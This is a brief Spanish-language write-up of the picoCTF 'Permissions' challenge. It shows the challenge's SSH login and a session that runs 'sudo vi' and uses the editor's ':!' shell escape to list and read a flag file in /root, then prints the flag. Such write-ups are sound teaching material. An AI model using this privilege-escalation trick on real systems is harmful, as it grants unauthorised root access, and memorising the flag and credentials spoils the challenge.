# Permissions
## Descripción

Can you read files in the root file?

Additional details will be available after launching your challenge instance.

The system admin has provisioned an account for you on the main server:`ssh -p 58940 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?
## Solución

```
┌──(adri㉿kali)-[~/Escritorio]
└─$ ssh -p 55329 picoplayer@saturn.picoctf.net


picoplayer@challenge:~$ sudo vi
[sudo] password for picoplayer:

[esc] :! ls -a /root
.  ..  .bashrc  .flag.txt  .profile

[esc] :! cat /root/.flag.txt

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
## Notas adicionales

Hacemos uso del editor vi con sudo el cual nos permite tener permisos que el usuario picoplayer carece
## Referencias